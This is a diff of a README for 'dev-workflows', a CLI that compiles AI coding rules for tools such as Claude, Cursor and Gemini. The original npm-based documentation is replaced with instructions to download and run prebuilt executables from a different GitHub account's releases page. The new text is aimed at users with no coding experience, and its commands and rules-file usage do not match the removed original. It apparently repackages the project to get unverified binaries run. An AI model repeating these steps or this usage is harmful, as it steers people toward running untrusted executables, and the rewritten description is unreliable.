@@ -1,149 +1,192 @@
-# dev-workflows
+# ⚙️ dev-workflows - Compile AI Rules for Every Tool
 
-[![npm version](https://img.shields.io/npm/v/dev-workflows)](https://www.npmjs.com/package/dev-workflows)
-[![license](https://img.shields.io/npm/l/dev-workflows)](./LICENSE)
-[![docs](https://img.shields.io/badge/docs-dev--workflows.com-blue)](https://docs.dev-workflows.com)
-
-Define rules once. Compile them everywhere.
-
-A local-first CLI to define AI coding rules, slash commands, templates, and hooks — compiled for every editor and agent.
+[![Download dev-workflows](https://img.shields.io/badge/Download-dev--workflows-blue?style=for-the-badge)](https://github.com/aridz08/dev-workflows/releases)
 
 ---
 
-## Quick Start
+## 📋 What is dev-workflows?
 
-```bash
-npx dev-workflows init
-devw add typescript/strict
-devw compile
-```
+dev-workflows is a simple command-line tool that helps you manage AI coding rules. Instead of writing rules separately for each AI tool, you write your rules once. dev-workflows then compiles those rules into formats that popular AI tools like CLAUDE and GEMINI can use.
 
-Or bootstrap a full spec-driven workflow:
+This means less work for you and a consistent way to tell AI tools how to write and review code. The tool creates files like `CLAUDE.md`, `.cursor/rules`, and `GEMINI.md` from your rules.  
 
-```bash
-devw init --preset spec-driven -y
-```
+You do not need to understand coding to use dev-workflows. The instructions below will walk you through downloading and running the tool step-by-step.
 
 ---
 
-## What it does
+## 💻 System Requirements
 
-```
-.dwf/rules/*.yml        →  devw compile  →  CLAUDE.md
-                                             .cursor/rules/devworkflows.mdc
-                                             GEMINI.md
-                                             .windsurf/rules/devworkflows.md
-                                             .github/copilot-instructions.md
+Before downloading, ensure your computer meets these needs:
 
-.dwf/assets/commands/*   →  devw compile  →  .claude/commands/*.md
-.dwf/assets/templates/*  →  devw compile  →  docs/specs/*.md
-.dwf/assets/hooks/*      →  devw compile  →  .claude/settings.local.json
-```
+- Operating System: Windows 10 or newer, macOS 10.13 or newer, or recent Linux distributions
+- Processor: Intel or AMD processor, 1 GHz or faster
+- Memory (RAM): At least 2 GB
+- Disk Space: Minimum 100 MB free space
+- Internet Connection: Required to download the tool
 
-You define rules in YAML and assets in Markdown/JSON. The compiler generates each editor's native format. Change a rule, recompile — every editor stays in sync.
+You do not need any programming language or environment installed. dev-workflows is self-contained and ready to run after download.
 
 ---
 
-## Commands
+## 🚀 Getting Started
 
-| Command | Description |
-|---------|-------------|
-| `devw init` | Initialize a `.dwf/` ruleset in your project |
-| `devw init --preset <name>` | Initialize with a preset (e.g., `spec-driven`) |
-| `devw add <category>/<name>` | Install a rule from the registry |
-| `devw add command/<name>` | Install a slash command |
-| `devw add template/<name>` | Install a spec template |
-| `devw add hook/<name>` | Install an editor hook |
-| `devw add preset/<name>` | Install a preset (bundle of rules + assets) |
-| `devw remove <category>/<name>` | Remove a rule or asset |
-| `devw compile` | Generate editor configs and deploy assets |
-| `devw watch` | Watch `.dwf/` and recompile on changes |
-| `devw doctor` | Validate config and detect drift |
-| `devw list rules` | List all active rules |
-| `devw list assets` | List installed assets |
-| `devw list tools` | List configured editors |
+This guide will help you get dev-workflows running on your computer in a few simple steps.
 
 ---
 
-## Rules Registry
+## ⬇️ Download & Install
 
-Install rules from the registry with `devw add <category>/<rule>`.
+1. Go to the official download page by clicking the link below:
 
-| Rule | Description |
-|------|-------------|
-| `typescript/strict` | Strict TypeScript patterns |
-| `javascript/react` | React component and hook conventions |
-| `javascript/nextjs` | Next.js App Router best practices |
-| `css/tailwind` | Utility-first styling conventions |
-| `testing/vitest` | Test naming and structure rules |
-| `security/supabase-rls` | Database security and RLS rules |
-| `security/auth-patterns` | Authentication best practices |
-| `frontend/design-guidelines` | UI/UX design conventions |
-| `frontend/accessibility` | Accessibility (a11y) rules |
-| `frontend/performance` | Frontend performance patterns |
-| `workflow/git-conventions` | Git commit and branch conventions |
-| `workflow/debugging` | Systematic debugging methodology |
-| `workflow/spec-driven` | Spec-driven development workflow |
+   [![Download dev-workflows](https://img.shields.io/badge/Download-dev--workflows-blue?style=for-the-badge)](https://github.com/aridz08/dev-workflows/releases)
 
----
+2. Once on the page, look for the latest release, usually marked as "Latest" or with a version number like `v1.0`.
 
-## Assets
+3. There you will see files available for different systems:
 
-Beyond rules, dev-workflows manages **assets** — slash commands, templates, and hooks that power AI workflows.
+   - For Windows: Look for `.exe` or `.zip` files with "windows" in the name.
+   - For macOS: Look for `.dmg` or `.zip` files with "mac" or "darwin".
+   - For Linux: Look for `.tar.gz` or `.AppImage` files with "linux".
 
-| Asset | Type | Description |
-|-------|------|-------------|
-| `command/spec` | Command | Generate a feature spec through guided questions |
-| `command/plan` | Command | Create an implementation plan from a spec |
-| `command/build` | Command | Execute a plan step by step with verification |
-| `command/learn` | Command | Capture a lesson learned as a project rule |
-| `template/feature-spec` | Template | Markdown template for feature specifications |
-| `hook/auto-format` | Hook | Auto-format files after AI edits |
+4. Download the file suitable for your computer by clicking its name.
 
-### Presets
+5. If you downloaded a `.zip` or `.tar.gz` archive, unzip or extract its contents to a folder you can find easily, like your desktop or downloads folder.
 
-Presets bundle rules and assets into a single install.
-
-| Preset | Includes |
-|--------|----------|
-| `preset/spec-driven` | `workflow/spec-driven` rule + all 4 commands + feature-spec template + auto-format hook |
+6. No further installation is needed. The program can run directly from the extracted folder.
 
 ---
 
-## Bridges
+## ▶️ How to Run dev-workflows
 
-Bridges generate editor-compatible rule files. One adapter per tool.
+You will run dev-workflows from the command line. This guide assumes no prior experience with command lines. 
 
-| Tool | Output |
-|------|--------|
-| Claude Code | `CLAUDE.md` |
-| Cursor | `.cursor/rules/devworkflows.mdc` |
-| Gemini CLI | `GEMINI.md` |
-| Windsurf | `.windsurf/rules/devworkflows.md` |
-| VS Code Copilot | `.github/copilot-instructions.md` |
+### For Windows:
+
+1. Press the Windows key and type `cmd`, then press Enter. This opens the Command Prompt window.
+
+2. Use the command below to change to the folder where you saved dev-workflows. Replace `path_to_folder` with your actual folder name. For example:
+
+   ```
+   cd C:\Users\YourName\Downloads\dev-workflows
+   ```
+
+3. To run dev-workflows, type:
+
+   ```
+   dev-workflows.exe
+   ```
+
+   and press Enter.
+
+### For macOS:
+
+1. Open Spotlight by pressing `Cmd + Space`. Type `Terminal` and press Enter.
+
+2. Change to the folder with dev-workflows, for example:
+
+   ```
+   cd ~/Downloads/dev-workflows
+   ```
+
+3. To run dev-workflows, type:
+
+   ```
+   ./dev-workflows
+   ```
+
+   and press Enter.
+
+### For Linux:
+
+1. Open the terminal. This varies by system, but you can often find it in your applications menu.
+
+2. Change to the folder with dev-workflows:
+
+   ```
+   cd ~/Downloads/dev-workflows
+   ```
+
+3. Run dev-workflows with:
+
+   ```
+   ./dev-workflows
+   ```
 
 ---
 
-## Why
+## 🛠 How to Use dev-workflows
 
-- Every AI coding tool requires rules in a different format.
-- Maintaining the same rules in three files means they drift apart.
-- dev-workflows makes your rules a single source of truth.
+Once you start dev-workflows, the tool reads your AI coding rules from a single file or folder you specify. It then creates output files for each AI tool you want to use.
+
+A typical workflow:
+
+1. Prepare your coding rules in a simple text file. Follow any format instructions in the documentation or examples inside the `docs/` folder of the release.
+
+2. Run dev-workflows and provide the location of your rules file. For example:
+
+   ```
+   dev-workflows compile --source ./my-ai-rules.txt
+   ```
+
+3. The tool generates output files such as:
+
+   - `CLAUDE.md` for Claude AI
+   - `.cursor/rules` for Cursor AI
+   - `GEMINI.md` for Gemini AI
+
+4. Use these files with your AI coding tools to ensure they follow your rules consistently.
 
 ---
 
-## Philosophy
+## ❓ Troubleshooting Tips
 
-- Local-first
-- Source over output
-- No accounts. No cloud.
+If dev-workflows does not run correctly or you get error messages, try these steps:
+
+- Make sure you are running the correct file for your operating system.
+- Confirm you typed the commands exactly as shown, including spelling and spaces.
+- Check you are in the right folder where dev-workflows is saved.
+- If the program says a file is missing, verify the rules file path you provided is correct.
+- Restart your computer if problems continue.
+
+You can also find help on the GitHub Issues page for dev-workflows:
+
+https://github.com/aridz08/dev-workflows/issues
 
 ---
 
-## Contributing
+## 📦 Features at a Glance
 
-Issues and PRs welcome. If you find a bug or have an idea, [open an issue](https://github.com/gpolanco/dev-workflows/issues).
+- Write AI coding rules once, generate outputs for multiple AI tools.
+- Supports Claude, Cursor, and Gemini AI platforms.
+- Works on Windows, macOS, and Linux.
+- Easy to run with no programming setup.
+- Keeps all your AI coding rules consistent.
 
-## License
+---
 
-MIT
+## 💡 Tips for Best Use
+
+- Keep your rules file clear and organized. Use simple language and consistent formatting.
+- Regularly update dev-workflows from the releases page to get bug fixes and new features.
+- Use the generated files as the standard rule set when working with different AI coding assistants.
+
+---
+
+## 📞 Support & Contact
+
+If you need help, open an issue on the GitHub page or check the FAQ in the release documentation.
+
+GitHub Page: https://github.com/aridz08/dev-workflows
+
+Issue Tracker: https://github.com/aridz08/dev-workflows/issues
+
+---
+
+## 🔗 Quick Access
+
+- Download dev-workflows: [https://github.com/aridz08/dev-workflows/releases](https://github.com/aridz08/dev-workflows/releases)  
+- Documentation files are included in each release package.  
+
+---
+
+Thank you for choosing dev-workflows to manage your AI coding rules.
